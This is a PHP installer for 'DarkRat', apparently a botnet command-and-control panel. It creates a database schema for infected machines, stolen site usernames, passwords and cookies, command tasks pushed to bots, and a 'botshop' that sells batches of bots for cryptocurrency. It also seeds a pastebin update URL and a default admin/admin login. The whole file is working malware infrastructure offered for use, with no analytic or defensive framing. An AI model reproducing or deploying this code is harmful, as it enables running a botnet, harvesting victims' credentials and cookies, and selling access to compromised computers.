<?php

class Install{



    function generateRandomString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

     public function index()
    {
        //uUog~{qyTKN{
        if(!empty($_POST)){
                //$mysqldatabaseRand = $this->generateRandomString(2);
               // $mysqlpassword = $this->generateRandomString(20);
               
                if(empty($_POST["mysqlusername"]) || empty($_POST["mysqlpassword"]) || empty($_POST["databaseName"])){
                    die("Error Wrong Details");
                }

                 $mysqldatabaseRand = $_POST["databaseName"];
                 $mysqlpassword = $_POST["mysqlpassword"];
                 $mysqlusername = $_POST["mysqlusername"];


                    try{
                        $databaseCon = new PDO('mysql:host=localhost', $mysqlusername, $mysqlpassword);
                    }catch(PDOException $e){
                        die($e->getmessage());
                    }
    
   /*
    *
    *               SET SQL_MODE = 'NO_AUTO_VALUE_ON_ZERO';
                    SET time_zone = '+00:00';
                    CREATE USER '".$mysqldatabaseRand."'@'localhost' IDENTIFIED BY  '".$mysqlpassword."';
                    GRANT USAGE ON *.* TO '".$mysqldatabaseRand."'@'localhost' REQUIRE NONE WITH MAX_QUERIES_PER_HOUR 0 MAX_CONNECTIONS_PER_HOUR 0 MAX_UPDATES_PER_HOUR 0 MAX_USER_CONNECTIONS 0;
                    CREATE DATABASE IF NOT EXISTS `".$mysqldatabaseRand."`;GRANT ALL PRIVILEGES ON `".$mysqldatabaseRand."`.* TO '".$mysqldatabaseRand."'@'localhost';
                    USE ".$mysqldatabaseRand.";
    *
    */
               $database = "
                    USE ".$mysqldatabaseRand.";
                    DROP TABLE IF EXISTS bots;
                    DROP TABLE IF EXISTS botshop_access;
                    DROP TABLE IF EXISTS botshop_orders;
                    DROP TABLE IF EXISTS config;
                    DROP TABLE IF EXISTS grabbed_cookies;
                    DROP TABLE IF EXISTS grabbed_users;
                    DROP TABLE IF EXISTS securitytokens;
                    DROP TABLE IF EXISTS tasks;
                    DROP TABLE IF EXISTS tasks_completed;
                    DROP TABLE IF EXISTS users;
                    -- phpMyAdmin SQL Dump
-- version 4.6.6deb4
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Erstellungszeit: 17. Mai 2019 um 19:55
-- Server-Version: 10.1.37-MariaDB-0+deb9u1
-- PHP-Version: 7.0.33-0+deb9u3

SET SQL_MODE = \"NO_AUTO_VALUE_ON_ZERO\";
SET time_zone = \"+00:00\";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Datenbank: `fP`
--

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `bots`
--

CREATE TABLE `bots` (
  `id` int(11) NOT NULL,
  `antivirus` varchar(255) DEFAULT NULL,
  `hwid` varchar(255) DEFAULT NULL,
  `computrername` varchar(100) DEFAULT NULL,
  `country` varchar(25) DEFAULT NULL,
  `netframework2` varchar(11) NOT NULL DEFAULT 'false',
  `netframework3` varchar(11) NOT NULL DEFAULT 'false',
  `netframework35` varchar(11) NOT NULL DEFAULT 'false',
  `netframework4` varchar(11) NOT NULL DEFAULT 'false',
  `latitude` varchar(255) DEFAULT NULL,
  `longitude` varchar(255) DEFAULT NULL,
  `countryName` varchar(255) DEFAULT NULL,
  `ram` varchar(255) DEFAULT NULL,
  `gpu` varchar(255) DEFAULT NULL,
  `cpu` varchar(255) DEFAULT NULL,
  `isadmin` varchar(255) DEFAULT NULL,
  `architecture` varchar(255) DEFAULT NULL,
  `ip` varchar(30) DEFAULT NULL,
  `lastresponse` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `operingsystem` varchar(255) DEFAULT NULL,
  `install_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `version` varchar(10) NOT NULL DEFAULT '0.0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `botshop_access`
--

CREATE TABLE `botshop_access` (
  `id` int(11) NOT NULL,
  `created_by_userid` int(255) NOT NULL,
  `apikey` varchar(255) NOT NULL,
  `active` int(11) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Daten für Tabelle `botshop_access`
--

INSERT INTO `botshop_access` (`id`, `created_by_userid`, `apikey`, `active`) VALUES
(1, 1, '9bd72c0966efa8c91b2c917f4afe79be', 1);

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `botshop_orders`
--

CREATE TABLE `botshop_orders` (
  `id` int(11) NOT NULL,
  `type` varchar(255) DEFAULT NULL,
  `address` varchar(255) DEFAULT NULL,
  `privatekey` varchar(255) DEFAULT NULL,
  `botamount` varchar(255) DEFAULT NULL,
  `loadurl` varchar(255) DEFAULT NULL,
  `coinstopay` varchar(255) DEFAULT NULL,
  `usd` varchar(255) DEFAULT NULL,
  `somesigfromkey` mediumtext,
  `userauthkey` varchar(255) DEFAULT NULL,
  `from_access_api` varchar(255) DEFAULT NULL,
  `payed` int(11) NOT NULL DEFAULT '0',
  `taskid` varchar(255) NOT NULL DEFAULT 'none'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Daten für Tabelle `botshop_orders`
--


-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `config`
--

CREATE TABLE `config` (
  `id` int(11) NOT NULL,
  `enryptionkey` varchar(255) DEFAULT NULL,
  `check_update_url` varchar(255) DEFAULT NULL,
  `useragent` varchar(255) DEFAULT NULL,
  `template` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Daten für Tabelle `config`
--

INSERT INTO `config` (`id`, `enryptionkey`, `check_update_url`, `useragent`, `template`) VALUES
(1, 'KQC', 'https://pastebin.com/raw/YBGEBviB', 'somesecret', 'v1');

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `grabbed_cookies`
--

CREATE TABLE `grabbed_cookies` (
  `id` int(11) NOT NULL,
  `site` varchar(255) DEFAULT NULL,
  `cookiename` varchar(255) DEFAULT NULL,
  `cookie` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Daten für Tabelle `grabbed_cookies`
--

INSERT INTO `grabbed_cookies` (`id`, `site`, `cookiename`, `cookie`) VALUES
(1, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `grabbed_users`
--

CREATE TABLE `grabbed_users` (
  `id` int(11) NOT NULL,
  `site` varchar(255) DEFAULT NULL,
  `username` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `securitytokens`
--

CREATE TABLE `securitytokens` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(10) NOT NULL,
  `identifier` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `securitytoken` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Daten für Tabelle `securitytokens`
--

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `tasks`
--

CREATE TABLE `tasks` (
  `id` int(11) NOT NULL,
  `filter` text NOT NULL,
  `status` varchar(100) NOT NULL,
  `task` varchar(255) NOT NULL DEFAULT '0',
  `command` varchar(255) DEFAULT NULL,
  `execution_limit` int(25) NOT NULL DEFAULT '0',
  `executed` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `tasks_completed`
--

CREATE TABLE `tasks_completed` (
  `id` int(11) NOT NULL,
  `bothwid` varchar(100) NOT NULL,
  `taskid` varchar(100) NOT NULL,
  `status` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `users`
--

CREATE TABLE `users` (
  `id` int(10) UNSIGNED NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `passwort` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `active` int(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Daten für Tabelle `users`
--


-- Indizes der exportierten Tabellen
--

--
-- Indizes für die Tabelle `bots`
--
ALTER TABLE `bots`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `botshop_access`
--
ALTER TABLE `botshop_access`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `botshop_orders`
--
ALTER TABLE `botshop_orders`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `config`
--
ALTER TABLE `config`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `grabbed_cookies`
--
ALTER TABLE `grabbed_cookies`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `grabbed_users`
--
ALTER TABLE `grabbed_users`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `securitytokens`
--
ALTER TABLE `securitytokens`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `tasks`
--
ALTER TABLE `tasks`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `tasks_completed`
--
ALTER TABLE `tasks_completed`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- AUTO_INCREMENT für exportierte Tabellen
--

--
-- AUTO_INCREMENT für Tabelle `bots`
--
ALTER TABLE `bots`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT für Tabelle `botshop_access`
--
ALTER TABLE `botshop_access`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT für Tabelle `botshop_orders`
--
ALTER TABLE `botshop_orders`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT für Tabelle `config`
--
ALTER TABLE `config`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT für Tabelle `grabbed_cookies`
--
ALTER TABLE `grabbed_cookies`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT für Tabelle `grabbed_users`
--
ALTER TABLE `grabbed_users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT für Tabelle `securitytokens`
--
ALTER TABLE `securitytokens`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
--
-- AUTO_INCREMENT für Tabelle `tasks`
--
ALTER TABLE `tasks`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT für Tabelle `tasks_completed`
--
ALTER TABLE `tasks_completed`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT für Tabelle `users`
--
ALTER TABLE `users`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;

                   INSERT INTO users SET username = 'admin', passwort = '".str_replace("%","$",'%2y%10%e031/Nzd4x5LWstBinp7puC2Wil1bRIqm6e/c0eKfD/tLZVwlupyG')."'
               ";

                try{
                    $statement = $databaseCon->prepare($database);
                    $statement->execute(array());
                    $databaseErrors = $statement->errorInfo();
                }catch(PDOException $e){
                    die($e->getmessage());
                }
                $string = "<?php \n %%%%pdo = new PDO('mysql:host=localhost;dbname=".$mysqldatabaseRand."', '".$mysqlusername."', '".$mysqlpassword."');";
                file_put_contents(__DIR__."/../../../../../config.php",str_replace("%%%%","$",$string));


                if($databaseErrors[2] == NULL){
                    echo "
                DarkRat is Installed<br>
                Please Change Default Login in the Admin Center
                <hr>
                Username: admin<br>
                Password: admin<br>
                    <br>
                <a href='/login'>Click Me to Login</a>
                ";
                }else{
                    var_dump($databaseErrors);
                }
                die();
        }

       
            $return = array(
                "mysql" => false,
                "writable" => array(),
                "dontwritable" => array(),
            );

            if(in_array("mysql",PDO::getAvailableDrivers())){
                $return["mysql"] = true;
            }
            $newFileName = __DIR__.'/../../../../../file.txt';
            $dirs = array_filter(glob('*'), 'is_dir');
            if (  is_writable(dirname($newFileName))) {
                $return["writable"][] = "Root Dir";
            }
            foreach ($dirs as $dir) {
                if (is_writable($dir)) {
                    $return["writable"][] = $dir;
                } else {
                    $return["dontwritable"][] = $dir;
                }
            }

            $GLOBALS["tpl"]->assign("return",$return);

    }
}